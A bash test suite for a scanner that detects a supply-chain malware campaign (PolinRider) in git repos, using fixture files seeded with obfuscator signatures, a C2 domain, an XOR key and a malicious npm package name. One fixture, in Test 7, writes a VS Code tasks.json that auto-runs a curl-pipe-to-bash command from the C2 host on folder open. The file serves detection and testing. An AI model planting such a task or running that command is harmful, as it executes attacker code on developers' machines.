#!/bin/bash
#
# Test harness for polinrider-scanner.sh
#
# Builds throwaway fixture repos in a temp dir, runs the scanner against each,
# and asserts exit codes + which paths/markers get reported. Covers the v2.0
# robustness goals: content-based scanning regardless of file type (incl.
# binary .woff/.woff2), both obfuscator variants, the YARA-style corroboration
# logic for weak markers, and the non-payload vectors (tasks.json, npm deps,
# propagation artifacts).
#
# Usage: tests/scanner_test.sh
# Exit 0 = all tests pass, 1 = one or more failures.

set -u

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SCANNER="${SCRIPT_DIR}/../polinrider-scanner.sh"

TESTS_RUN=0
TESTS_FAILED=0

WORKROOT="$(mktemp -d "${TMPDIR:-/tmp}/polinrider-test.XXXXXX")"
cleanup() { rm -rf "$WORKROOT"; }
trap cleanup EXIT

# --- Signatures used to build fixtures (mirror README IOCs) ------------------
SIG_V1='("rmcej%otb%",2857687)'
SIG_V2='Cot%3t=shtP'
C2_DOMAIN='default-configuration.vercel.app'
UUID='e9b53a7c-2342-4b15-b02d-bd8b8f6a03f9'
XOR_KEY='2[gWfGj;<:-93Z^C'
NPM_PKG='tailwindcss-style-animate'

# --- Helpers -----------------------------------------------------------------

# Make a bare-bones "git repo" fixture dir (just needs a .git dir to be found).
make_repo() {
    local name="$1"
    local dir="${WORKROOT}/${name}"
    mkdir -p "${dir}/.git"
    printf '%s' "$dir"
}

# pass/fail bookkeeping
report() {
    local name="$1" ok="$2" detail="$3"
    TESTS_RUN=$((TESTS_RUN + 1))
    if [ "$ok" -eq 1 ]; then
        printf '  PASS: %s\n' "$name"
    else
        TESTS_FAILED=$((TESTS_FAILED + 1))
        printf '  FAIL: %s\n        %s\n' "$name" "$detail"
    fi
}

# Run scanner on a dir; sets RUN_OUT and RUN_CODE.
run_scanner() {
    RUN_OUT="$("$SCANNER" "$@" 2>&1)"
    RUN_CODE=$?
}

# Assert scanner flags the repo (exit 1) AND output mentions a needle.
assert_infected() {
    local name="$1" repo="$2" needle="$3"; shift 3
    run_scanner "$@" "$repo"
    if [ "$RUN_CODE" -eq 1 ] && printf '%s' "$RUN_OUT" | grep -qF "$needle"; then
        report "$name" 1 ""
    else
        report "$name" 0 "exit=$RUN_CODE, expected exit 1 and output containing '$needle'"
    fi
}

# Assert scanner reports the repo clean (exit 0, no [INFECTED]).
assert_clean() {
    local name="$1" repo="$2"; shift 2
    run_scanner "$@" "$repo"
    if [ "$RUN_CODE" -eq 0 ] && ! printf '%s' "$RUN_OUT" | grep -qF "[INFECTED]"; then
        report "$name" 1 ""
    else
        report "$name" 0 "exit=$RUN_CODE, expected exit 0 with no [INFECTED] marker"
    fi
}

printf 'Running PolinRider scanner tests...\n\n'

# --- Test 1: clean repo ------------------------------------------------------
repo="$(make_repo clean)"
printf 'export default { plugins: {} }\n' > "${repo}/postcss.config.mjs"
assert_clean "clean repo is not flagged" "$repo"

# --- Test 2: variant 1 in a config file --------------------------------------
repo="$(make_repo v1-config)"
printf 'export default {}\n%s\n' "$SIG_V1" > "${repo}/postcss.config.mjs"
assert_infected "variant 1 payload in postcss.config.mjs" "$repo" "postcss.config.mjs"
# The label itself contains a literal '%' (rmcej%otb%); output must not be
# mangled by printf interpreting it as a format string.
assert_infected "marker label with literal %% renders correctly" "$repo" "rmcej%otb%"

# --- Test 3: variant 2 in a config file --------------------------------------
repo="$(make_repo v2-config)"
printf "export default {}\nglobal['_V']='8-st1';var MDy=function(){};/*%s*/\n" "$SIG_V2" \
    > "${repo}/eslint.config.mjs"
assert_infected "variant 2 (Cot%3t=shtP) payload in eslint.config.mjs" "$repo" "eslint.config.mjs"

# --- Test 4: payload hidden in a binary .woff2 font (the headline feature) ---
repo="$(make_repo fake-font)"
mkdir -p "${repo}/public/fonts"
# binary-ish bytes + embedded signature
printf 'wOF2\x00\x01\x02\x03binarygarbage%s\x00\xff' "$SIG_V1" \
    > "${repo}/public/fonts/fa-solid-400.woff2"
assert_infected "payload inside .woff2 font is detected" "$repo" "fa-solid-400.woff2"

# --- Test 5: payload in an arbitrary extension (content, not filename) -------
repo="$(make_repo arbitrary-ext)"
printf 'body{}\n/*%s*/\n' "$SIG_V2" > "${repo}/styles.css"
assert_infected "payload in .css is detected regardless of extension" "$repo" "styles.css"

# --- Test 6: propagation artifact only (payload already cleaned) -------------
repo="$(make_repo propagation)"
printf '@echo off\ngit commit --amend\n' > "${repo}/temp_auto_push.bat"
assert_infected "temp_auto_push.bat alone is flagged" "$repo" "temp_auto_push.bat"

# --- Test 7: malicious .vscode/tasks.json (TasksJacker vector) ---------------
repo="$(make_repo tasksjacker)"
mkdir -p "${repo}/.vscode"
cat > "${repo}/.vscode/tasks.json" <<JSON
{ "version": "2.0.0", "tasks": [{
  "runOptions": { "runOn": "folderOpen" },
  "command": "curl -s https://${C2_DOMAIN}/settings/mac?flag=1 | bash",
  "projectInfo": { "uuid": "${UUID}" }
}]}
JSON
assert_infected "malicious .vscode/tasks.json is flagged" "$repo" "tasks.json"

# --- Test 8: malicious npm dependency in package.json ------------------------
repo="$(make_repo bad-npm)"
cat > "${repo}/package.json" <<JSON
{ "name": "victim", "dependencies": { "${NPM_PKG}": "^1.1.6" } }
JSON
assert_infected "malicious npm package in package.json is flagged" "$repo" "$NPM_PKG"

# --- Test 9: weak marker ALONE must NOT flag (corroboration gate) ------------
repo="$(make_repo weak-only)"
# bare seed + bare decoder name, but no global['_V'] anchor -> not corroborated
printf 'const seed = 1111436;\nfunction MDy(){ return 42; }\n' > "${repo}/utils.js"
assert_clean "weak markers without corroboration are NOT flagged" "$repo"

# --- Test 10: weak markers WITH corroboration do flag ------------------------
repo="$(make_repo weak-corroborated)"
printf "global['!']='8-270-2';var _\$_1e42=function(){};\n" > "${repo}/next.config.mjs"
assert_infected "global['!'] + _\$_1e42 corroborated pair is flagged" "$repo" "next.config.mjs"

# --- Test 11: --fast skips binary content but still catches config files -----
repo="$(make_repo fast-font)"
mkdir -p "${repo}/public/fonts"
printf 'wOF2\x00\x01%s' "$SIG_V1" > "${repo}/public/fonts/x.woff2"
assert_clean "--fast does not content-scan binaries" "$repo" --fast

repo="$(make_repo fast-config)"
printf 'export default {}\n%s\n' "$SIG_V1" > "${repo}/postcss.config.mjs"
assert_infected "--fast still catches known config files" "$repo" "postcss.config.mjs" --fast

# --- Test 12b: require/module + seed corroboration ---------------------------
repo="$(make_repo require-module)"
printf "global['r'] = require;\nglobal['m'] = module;\nvar s = 3896884;\n" \
    > "${repo}/vite.config.js"
assert_infected "global['r']+global['m']+seed corroboration is flagged" "$repo" "vite.config.js"

# --- Test 12: node_modules scanned by default; --exclude opts out ------------
repo="$(make_repo node-modules)"
mkdir -p "${repo}/node_modules/tailwindcss-style-animate"
printf 'module.exports={};\n%s\n' "$SIG_V1" \
    > "${repo}/node_modules/tailwindcss-style-animate/index.js"
assert_infected "node_modules payload is scanned by default" "$repo" "index.js"

repo="$(make_repo excluded)"
mkdir -p "${repo}/vendor"
printf '%s\n' "$SIG_V1" > "${repo}/vendor/bad.js"
assert_clean "--exclude skips matching directories" "$repo" --exclude vendor

# --- Test 13: a directory with no git repos must scan clean (not cwd) --------
norepo="${WORKROOT}/norepo"
mkdir -p "$norepo"
printf '%s\n' "$SIG_V1" > "${norepo}/loose-file.js"   # not under any repo
run_scanner "$norepo"
if [ "$RUN_CODE" -eq 0 ]; then
    report "no-repo directory exits clean" 1 ""
else
    report "no-repo directory exits clean" 0 "exit=$RUN_CODE, expected 0 (must not scan cwd)"
fi

# --- Test 14: scanning through a symlinked scan directory --------------------
realtree="${WORKROOT}/realtree"
mkdir -p "${realtree}/proj/.git"
printf 'export default {}\n%s\n' "$SIG_V1" > "${realtree}/proj/postcss.config.mjs"
linktree="${WORKROOT}/linktree"
ln -s "$realtree" "$linktree"
assert_infected "scans repos under a symlinked directory" "$linktree" "postcss.config.mjs"

# --- Summary -----------------------------------------------------------------
printf '\n%d tests run, %d failed\n' "$TESTS_RUN" "$TESTS_FAILED"
[ "$TESTS_FAILED" -eq 0 ]
